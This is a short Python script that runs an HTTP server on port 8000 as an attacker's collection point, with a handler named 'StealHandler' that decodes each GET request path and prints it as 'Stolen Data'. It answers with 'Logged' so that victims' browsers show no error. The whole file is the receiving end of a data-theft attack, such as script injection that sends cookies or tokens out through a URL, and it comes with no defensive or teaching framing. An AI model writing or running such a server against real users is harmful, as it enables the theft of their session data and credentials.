from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

class StealHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        data = urllib.parse.unquote(self.path)
        print(f"🔥 Stolen Data: {data}")

        # Respond to prevent browser errors
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'Logged')

server_address = ('', 8000)  # Change port if needed
httpd = HTTPServer(server_address, StealHandler)
print("🚀 Listening for stolen data on port 8000...")
httpd.serve_forever()
